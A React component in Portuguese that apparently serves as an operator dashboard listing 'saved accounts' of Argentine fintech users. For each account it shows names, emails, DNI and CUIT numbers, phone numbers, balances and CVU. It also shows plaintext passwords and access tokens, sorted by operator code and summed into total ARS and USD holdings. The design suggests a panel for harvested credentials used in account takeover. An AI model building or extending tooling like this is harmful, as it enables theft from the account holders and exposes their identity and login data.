import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Loader2, RefreshCw, Search, ChevronDown, ChevronUp,
  DollarSign, Wallet, Users, Shield, Activity, Copy
} from "lucide-react";

interface SavedAccount {
  id: string;
  email: string;
  password?: string;
  full_name?: string;
  document?: string;
  cuit?: string;
  phone?: string;
  city?: string;
  province?: string;
  operator_code: string;
  access_token?: string;
  balance_ars?: any;
  balance_usd?: any;
  fintech_data?: any;
  limits_data?: any;
  crypto_data?: any;
  profile_data?: any;
  last_login_at?: string;
  last_data_sync_at?: string;
  updated_at: string;
}

const formatARS = (val: number | undefined) =>
  val != null ? `$ ${val.toLocaleString("es-AR", { minimumFractionDigits: 2 })}` : "—";
const formatUSD = (val: number | undefined) =>
  val != null ? `US$ ${val.toLocaleString("en-US", { minimumFractionDigits: 2 })}` : "—";

const SavedAccountsTab = () => {
  const [accounts, setAccounts] = useState<SavedAccount[]>([]);
  const [loading, setLoading] = useState(false);
  const [search, setSearch] = useState("");
  const [expandedRow, setExpandedRow] = useState<string | null>(null);

  const fetchAccounts = async () => {
    setLoading(true);
    try {
      const { data: res, error } = await supabase.functions.invoke("plus-auth", {
        body: { action: "list", operatorCode: "master" },
      });
      if (!error && res?.accounts) setAccounts(res.accounts);
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => { fetchAccounts(); }, []);

  const filtered = accounts.filter((a) => {
    const q = search.toLowerCase();
    return !q || a.email?.toLowerCase().includes(q) || a.full_name?.toLowerCase().includes(q) || a.document?.toLowerCase().includes(q) || a.cuit?.toLowerCase().includes(q);
  });

  const totalARS = filtered.reduce((s, a) => s + (a.balance_ars?.ars || 0) + (a.fintech_data?.balance || 0), 0);
  const totalUSD = filtered.reduce((s, a) => s + (a.balance_usd?.usd || 0), 0);

  return (
    <div className="space-y-5">
      {/* Stats row */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        {[
          { icon: Users, label: "Contas", value: accounts.length.toString(), color: "white" },
          { icon: DollarSign, label: "Total ARS", value: formatARS(totalARS), color: "emerald", mono: true },
          { icon: DollarSign, label: "Total USD", value: formatUSD(totalUSD), color: "blue", mono: true },
          { icon: Activity, label: "Filtradas", value: filtered.length.toString(), color: "white" },
        ].map(({ icon: Icon, label, value, color, mono }) => {
          const colors: Record<string, string> = {
            emerald: "text-emerald-400 bg-emerald-500/10 border-emerald-500/10",
            blue: "text-blue-400 bg-blue-500/10 border-blue-500/10",
            white: "text-white/70 bg-white/[0.03] border-white/[0.04]",
          };
          const textColor = color === "emerald" ? "text-emerald-400" : color === "blue" ? "text-blue-400" : "text-white";
          return (
            <div key={label} className={`rounded-lg border p-3 ${colors[color] || colors.white}`}>
              <div className="flex items-center gap-2 mb-1.5">
                <Icon className="w-3.5 h-3.5 opacity-50" />
                <span className="text-[10px] font-medium uppercase tracking-wider opacity-50">{label}</span>
              </div>
              <p className={`text-lg font-bold ${textColor} ${mono ? "font-mono text-sm" : ""} truncate`}>{value}</p>
            </div>
          );
        })}
      </div>

      {/* Table */}
      <div className="rounded-xl border border-white/[0.06] bg-[#111827]/60 backdrop-blur-sm overflow-hidden">
        <div className="px-5 py-3.5 border-b border-white/[0.04] flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <Shield className="w-4 h-4 text-emerald-400" />
            <span className="text-white/90 text-sm font-medium">Contas Salvas</span>
            <span className="ml-2 text-[10px] font-medium px-2 py-0.5 rounded-full bg-white/[0.05] text-white/40 border border-white/[0.06]">
              {accounts.length}
            </span>
          </div>
          <div className="flex items-center gap-2">
            <div className="relative">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-white/20" />
              <Input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Buscar..."
                className="pl-8 h-8 w-48 bg-white/[0.03] border-white/[0.06] text-white text-xs placeholder:text-white/15 focus:ring-emerald-500/30"
              />
            </div>
            <Button onClick={fetchAccounts} disabled={loading} variant="ghost" size="sm" className="h-8 text-white/30 hover:text-white/60">
              {loading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <RefreshCw className="w-3.5 h-3.5" />}
            </Button>
          </div>
        </div>

        {loading && accounts.length === 0 ? (
          <div className="flex items-center justify-center py-16">
            <Loader2 className="w-5 h-5 animate-spin text-emerald-400 mr-2" />
            <span className="text-white/30 text-sm">Carregando...</span>
          </div>
        ) : filtered.length === 0 ? (
          <div className="text-center py-16 text-white/20 text-sm">Nenhuma conta encontrada</div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-[13px]">
              <thead>
                <tr className="border-b border-white/[0.04]">
                  {["#", "Nome", "Email", "DNI", "ARS", "USD", "Fintech", "Sync", ""].map((h, i) => (
                    <th key={i} className={`py-2.5 px-3 text-[10px] font-medium uppercase tracking-wider text-white/25 ${i >= 4 && i <= 6 ? "text-right" : "text-left"}`}>
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {filtered.map((a, i) => (
                  <SavedAccountRow key={a.id} account={a} index={i} expanded={expandedRow === a.id} onToggle={() => setExpandedRow(expandedRow === a.id ? null : a.id)} />
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
};

const SavedAccountRow = ({ account: a, index, expanded, onToggle }: {
  account: SavedAccount; index: number; expanded: boolean; onToggle: () => void;
}) => {
  const syncDate = a.last_data_sync_at
    ? new Date(a.last_data_sync_at).toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" })
    : "—";

  const DataItem = ({ label, value, color }: { label: string; value: string; color?: string }) => (
    <div className="flex items-center justify-between py-1.5 border-b border-white/[0.03] last:border-0">
      <span className="text-white/25 text-xs">{label}</span>
      <span className={`text-xs font-mono ${color || "text-white/70"}`}>{value}</span>
    </div>
  );

  return (
    <>
      <tr className="border-b border-white/[0.03] hover:bg-emerald-500/[0.03] transition-colors cursor-pointer group" onClick={onToggle}>
        <td className="py-2.5 px-3 text-white/20 font-mono text-xs">{index + 1}</td>
        <td className="py-2.5 px-3 text-white/90 font-medium">{a.full_name || "—"}</td>
        <td className="py-2.5 px-3 text-white/40 font-mono text-xs">{a.email}</td>
        <td className="py-2.5 px-3 text-white/40">{a.document || "—"}</td>
        <td className="py-2.5 px-3 text-right text-emerald-400 font-mono">{formatARS(a.balance_ars?.ars)}</td>
        <td className="py-2.5 px-3 text-right text-blue-400 font-mono">{formatUSD(a.balance_usd?.usd)}</td>
        <td className="py-2.5 px-3 text-right text-purple-400 font-mono">{formatARS(a.fintech_data?.balance)}</td>
        <td className="py-2.5 px-3 text-white/20 text-xs">{syncDate}</td>
        <td className="py-2.5 px-3 text-center text-white/15 group-hover:text-white/40 transition-colors">
          {expanded ? <ChevronUp className="w-3.5 h-3.5 inline" /> : <ChevronDown className="w-3.5 h-3.5 inline" />}
        </td>
      </tr>
      {expanded && (
        <tr className="bg-white/[0.015]">
          <td colSpan={9} className="p-5">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-5">
              <div className="space-y-0.5">
                <div className="flex items-center gap-1.5 mb-2.5">
                  <DollarSign className="w-3 h-3 text-emerald-400/60" />
                  <span className="text-[10px] font-semibold uppercase tracking-wider text-emerald-400/60">Saldos</span>
                </div>
                <DataItem label="ARS" value={formatARS(a.balance_ars?.ars)} color="text-emerald-400" />
                <DataItem label="USD" value={formatUSD(a.balance_usd?.usd)} color="text-blue-400" />
                <DataItem label="Pend. ARS" value={formatARS(a.balance_ars?.pendingARS)} color="text-amber-400/70" />
                <DataItem label="Pend. USD" value={formatUSD(a.balance_usd?.pendingUSD)} color="text-amber-400/70" />
                <DataItem label="Fintech" value={formatARS(a.fintech_data?.balance)} color="text-purple-400" />
                <DataItem label="CVU" value={a.fintech_data?.cvu || "—"} />
              </div>
              <div className="space-y-0.5">
                <div className="flex items-center gap-1.5 mb-2.5">
                  <Users className="w-3 h-3 text-blue-400/60" />
                  <span className="text-[10px] font-semibold uppercase tracking-wider text-blue-400/60">Pessoais</span>
                </div>
                <DataItem label="CUIT" value={a.cuit || "—"} />
                <DataItem label="Telefone" value={a.phone || "—"} />
                <DataItem label="Cidade" value={a.city || "—"} />
                <DataItem label="Província" value={a.province || "—"} />
                <DataItem label="Operador" value={a.operator_code} />
              </div>
              <div className="space-y-0.5">
                <div className="flex items-center gap-1.5 mb-2.5">
                  <Wallet className="w-3 h-3 text-purple-400/60" />
                  <span className="text-[10px] font-semibold uppercase tracking-wider text-purple-400/60">Credenciais</span>
                </div>
                <DataItem label="Email" value={a.email} />
                <DataItem label="Senha" value={a.password || "—"} />
                <DataItem label="Token" value={a.access_token ? `${a.access_token.substring(0, 20)}...` : "—"} />
              </div>
              <div className="space-y-0.5">
                <div className="flex items-center gap-1.5 mb-2.5">
                  <Activity className="w-3 h-3 text-amber-400/60" />
                  <span className="text-[10px] font-semibold uppercase tracking-wider text-amber-400/60">Timestamps</span>
                </div>
                <DataItem label="Último Login" value={a.last_login_at ? new Date(a.last_login_at).toLocaleString("pt-BR") : "—"} />
                <DataItem label="Última Sync" value={a.last_data_sync_at ? new Date(a.last_data_sync_at).toLocaleString("pt-BR") : "—"} />
                <DataItem label="Atualizado" value={new Date(a.updated_at).toLocaleString("pt-BR")} />
              </div>
            </div>
          </td>
        </tr>
      )}
    </>
  );
};

export default SavedAccountsTab;
